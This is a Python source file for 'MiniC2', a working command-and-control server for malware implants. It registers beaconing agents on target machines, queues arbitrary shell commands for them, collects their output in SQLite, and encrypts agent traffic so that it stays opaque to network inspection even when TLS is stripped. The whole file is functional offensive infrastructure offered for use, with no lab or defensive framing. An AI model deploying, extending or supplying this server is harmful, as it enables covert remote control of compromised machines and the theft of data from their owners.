"""
server.py — MiniC2 Command-and-Control Server

This is the "server-side" half of the C2 framework. It has two audiences:
  - Agents (implants running on target machines) — they POST check-ins and
    results to the /beacon and /result endpoints.
  - The operator (you, via operator.py) — who reads agent lists, queues
    commands, and retrieves results through the remaining endpoints.

Endpoints
─────────
  POST /beacon        Agent check-in. Returns any commands queued for this agent.
  POST /result        Agent submits output for a completed command.
  GET  /agents        List all agents that have ever beaconed in.
  POST /task          Queue a shell command for a specific agent.
  GET  /results/<id>  Retrieve all completed task results for an agent.

Storage
───────
  A local SQLite database (c2.db) persists agents, tasks, and results
  across server restarts. The schema is created automatically on first run.

Encryption
──────────
  All agent-facing traffic is AES-256-GCM encrypted at the application layer,
  on top of TLS. This is a defence-in-depth measure: even if TLS is stripped
  by a proxy or MITM, the payload is still opaque to the inspector.

Usage:
    python server.py          # starts on https://0.0.0.0:4443
    # Requires cert.pem and key.pem in this directory — run scripts/gen_cert.sh first.
"""

import datetime
import sqlite3
import uuid
import ssl

from flask import Flask, jsonify, request
from crypto import decrypt, encrypt

# ── Configuration ────────────────────────────────────────────────────────────
HOST      = "0.0.0.0"
PORT      = 4443
CERT_FILE = "cert.pem"
KEY_FILE  = "key.pem"
DB_FILE   = "c2.db"
# ─────────────────────────────────────────────────────────────────────────────

app = Flask(__name__)


# ── Database helpers ──────────────────────────────────────────────────────────

def get_db():
    """Open a SQLite connection (thread-local; Flask handles threading)."""
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row          # enables dict-style access
    return conn


def init_db():
    """Create tables on first run."""
    conn = get_db()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            id          TEXT PRIMARY KEY,
            hostname    TEXT,
            os          TEXT,
            ip          TEXT,
            last_seen   TEXT
        );

        CREATE TABLE IF NOT EXISTS tasks (
            id          TEXT PRIMARY KEY,
            agent_id    TEXT NOT NULL,
            command     TEXT NOT NULL,
            status      TEXT NOT NULL DEFAULT 'pending',
            created_at  TEXT NOT NULL
        );

        CREATE TABLE IF NOT EXISTS results (
            id          TEXT PRIMARY KEY,
            task_id     TEXT NOT NULL,
            agent_id    TEXT NOT NULL,
            output      TEXT,
            received_at TEXT NOT NULL
        );
    """)
    conn.commit()
    conn.close()
    print(f"[*] Database initialised: {DB_FILE}")


# ── Agent-facing endpoints ────────────────────────────────────────────────────

@app.route("/beacon", methods=["POST"])
def beacon():
    """
    Agent check-in.

    Request body (JSON):  {"data": "<AES-encrypted payload>"}
    Decrypted payload:    {"agent_id": str, "hostname": str, "os": str}

    Response body (JSON): {"data": "<AES-encrypted payload>"}
    Decrypted response:   {"tasks": [{"id": str, "command": str}, ...]}
    """
    try:
        payload = decrypt(request.json["data"])
    except Exception:
        return jsonify({"error": "bad request"}), 400

    agent_id = payload.get("agent_id")
    now      = datetime.datetime.utcnow().isoformat()

    conn = get_db()
    try:
        # Upsert agent registration
        conn.execute(
            """INSERT INTO agents (id, hostname, os, ip, last_seen)
               VALUES (?, ?, ?, ?, ?)
               ON CONFLICT(id) DO UPDATE SET
                   hostname  = excluded.hostname,
                   os        = excluded.os,
                   ip        = excluded.ip,
                   last_seen = excluded.last_seen""",
            (agent_id, payload.get("hostname"), payload.get("os"),
             request.remote_addr, now)
        )

        # Fetch all pending tasks for this agent
        rows = conn.execute(
            "SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending'",
            (agent_id,)
        ).fetchall()

        # Mark them as sent so they aren't re-delivered on the next beacon
        for row in rows:
            conn.execute(
                "UPDATE tasks SET status = 'sent' WHERE id = ?", (row["id"],)
            )

        conn.commit()
    finally:
        conn.close()

    tasks = [{"id": r["id"], "command": r["command"]} for r in rows]
    if tasks:
        print(f"[+] Beacon from {agent_id[:8]}... — dispatching {len(tasks)} task(s)")
    else:
        print(f"[*] Beacon from {agent_id[:8]}... — no tasks queued")

    return jsonify({"data": encrypt({"tasks": tasks})})


@app.route("/result", methods=["POST"])
def result():
    """
    Agent submits the output of a completed task.

    Decrypted request payload:
        {"agent_id": str, "task_id": str, "output": str}
    """
    try:
        payload = decrypt(request.json["data"])
    except Exception:
        return jsonify({"error": "bad request"}), 400

    conn = get_db()
    try:
        conn.execute(
            """INSERT INTO results (id, task_id, agent_id, output, received_at)
               VALUES (?, ?, ?, ?, ?)""",
            (str(uuid.uuid4()), payload["task_id"], payload["agent_id"],
             payload.get("output", ""), datetime.datetime.utcnow().isoformat())
        )
        conn.execute(
            "UPDATE tasks SET status = 'done' WHERE id = ?", (payload["task_id"],)
        )
        conn.commit()
    finally:
        conn.close()

    print(f"[+] Result received for task {payload['task_id'][:8]}...")
    return jsonify({"data": encrypt({"status": "ok"})})


# ── Operator-facing endpoints ─────────────────────────────────────────────────

@app.route("/agents", methods=["GET"])
def list_agents():
    """Return all registered agents."""
    conn = get_db()
    rows = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])


@app.route("/task", methods=["POST"])
def add_task():
    """
    Queue a command for a specific agent.

    Request body (JSON): {"agent_id": str, "command": str}
    """
    body     = request.json
    task_id  = str(uuid.uuid4())
    now      = datetime.datetime.utcnow().isoformat()

    conn = get_db()
    conn.execute(
        "INSERT INTO tasks (id, agent_id, command, status, created_at) VALUES (?,?,?,'pending',?)",
        (task_id, body["agent_id"], body["command"], now)
    )
    conn.commit()
    conn.close()

    print(f"[*] Task queued for {body['agent_id'][:8]}... → {body['command']}")
    return jsonify({"task_id": task_id})


@app.route("/results/<agent_id>", methods=["GET"])
def get_results(agent_id):
    """Return all task results for a given agent, newest first."""
    conn = get_db()
    rows = conn.execute(
        "SELECT * FROM results WHERE agent_id = ? ORDER BY received_at DESC",
        (agent_id,)
    ).fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    init_db()

    # Build TLS context — requires cert.pem and key.pem in the same directory.
    # Generate them with:  scripts/gen_cert.sh
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.load_cert_chain(CERT_FILE, KEY_FILE)

    print(f"[*] MiniC2 server starting on https://{HOST}:{PORT}")
    app.run(host=HOST, port=PORT, ssl_context=context, debug=False)
